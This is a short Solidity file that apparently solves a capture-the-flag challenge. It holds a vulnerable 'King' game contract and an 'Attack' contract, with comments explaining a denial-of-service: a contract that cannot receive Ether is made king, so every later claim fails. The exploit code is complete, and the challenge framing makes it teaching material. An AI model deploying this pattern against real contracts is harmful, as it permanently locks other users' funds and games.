// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

//Challenge - Break this game contract
contract King {

  address king;
  uint public prize;
  address public owner;

  constructor() payable {
    owner = msg.sender;  
    king = msg.sender;
    prize = msg.value;
  }

  receive() external payable {
    require(msg.value >= prize || msg.sender == owner);
    payable(king).transfer(msg.value);
    king = msg.sender;
    prize = msg.value;
  }

  function _king() public view returns (address) {
    return king;
  }
}

//////////////////////////////////////////////
///////////////ATTACK/////////////////////////
//////////////////////////////////////////////

//The vulnerability here is not testing the king if it is a contract or wallet.
// If we make contract "Attack" king of this game and don't define any function of receiving Ether, then 
// nobody can be the king again because the receive funcion will always fail as it is sending ether to teh previous 
// King and in this case our "Attack" contract cannot receive ether. 
contract Attack {
    address king;

    constructor(address _addr) {
        king = _addr;
    }

    function attack() external payable {
      (bool success ,) = king.call{value:msg.value}("");
    require(success);
    }
}
